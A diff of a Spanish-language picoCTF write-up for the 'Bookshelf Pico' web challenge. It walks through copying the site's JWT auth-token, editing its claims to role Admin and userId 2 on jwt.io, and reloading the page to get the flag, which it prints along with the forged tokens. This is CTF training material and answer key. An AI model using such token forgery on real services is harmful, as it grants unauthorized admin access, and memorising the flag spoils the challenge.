@@ -5,7 +5,7 @@ BookShelf Pico, my premium online book-reading service.I believe that my website
 - Username: "user"
 - Password: "user"
 
-Source code can be downloaded [here](https://artifacts.picoctf.net/c/482/bookshelf-pico.zip).
+Source code can be downloaded [here](https://artifacts.picoctf.net/c/482/bookshelf-pico.zip).Website can be accessed [here!](http://saturn.picoctf.net:54256/).
 
 
 #### Hinst:
@@ -24,41 +24,83 @@ Source code can be downloaded [here](https://artifacts.picoctf.net/c/482/booksh
 ## Solución:
 ```
 
-1. Ingresamos en la pagina y nos registramos
+1. Ingresamos en la pagina y nos registramos para username:user y contrseña:user
 
 2. Le damos en la parte de un cuadro que dice flag
 
 3. Insepccionar y en aplication
+* Ahí ir a storange
+* Despues en Local storange y el link de abajo
+
 
 
 4. Copiar cookie
-eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc0NTM4NDk4MiwiaWF0IjoxNzQ0NzgwMTgyLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.REgTLnhvnra2fTNnuyLzxSGI34yCtwLc5OdZsLkaPNk
+-En auth-token copiar valor
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc0NTQzNTYwNiwiaWF0IjoxNzQ0ODMwODA2LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.WHomoz9KI7XuimuHBrFMzHDdawvCPFV5zBStbI0ne1c
+
+
+
+
 
 
 5. Ir a convertirla jwt.io
-Nos apoyamos de [jwt token editor](https://jwt.io/), y modificamos tanto la contraseña (a 1234), el usuario y el rol (admin), así como el userID(2). Y nos da este nuevo token:
+Nos apoyamos de [jwt token editor](https://jwt.io/), y modificamos tanto la contraseña (a 1234), el usuario y el rol (Admin), así como el userID(2) y email(admin) . Y nos da este nuevo token:
+
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NDU0MzU2MDYsImlhdCI6MTc0NDgzMDgwNiwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.DKELjsuRUWIUpxn9F6sYyHdAEik_PgI8NauUEYnN9Kw
 
 
 
-
-6. Después el nuevo valor modificarlo y actualizar
-
-eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NDUzODQ5ODIsImlhdCI6MTc0NDc4MDE4MiwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.V0VpQj-61PoAAyGmAFfLnbVkgtSmtbFXhsT71IExZUw
-
-
-
-7. Te dara la  bandera
 
 ```
 
+De esta forma modificarlo y de ahí te dará el nuevo valor de la cookie:
+
+![[Pasted image 20250416134348.png]]
+
+
+
+
+```
+
+6. Después el nuevo valor modificarlo y ponerlo dentro de la pagina web, esta es la cookie:
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NDU0MzU2MDYsImlhdCI6MTc0NDgzMDgwNiwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.DKELjsuRUWIUpxn9F6sYyHdAEik_PgI8NauUEYnN9Kw
+
+
+
+
+
+7. Tambien modifica el payload, de esta forma, como lo modificaste en el paso 5 y luego actualizas la pagina, depues de tener los dos valores modificados
+
+{"role":"Admin","iss":"bookshelf","exp":1745435606,"iat":1744830806,"userId":2,"email":"admin"}
+
+
+
+
+
+8. Te dara la  bandera
+picoCTF{w34k_jwt_n0t_g00d_d72df65e}
+
+
+
+```
+
+
+
+![[Pasted image 20250416133537.png]]
 
 
 #### Bandera
 
 ```
-
+picoCTF{w34k_jwt_n0t_g00d_d72df65e}
 
 ```
+
+
+
 
 
 
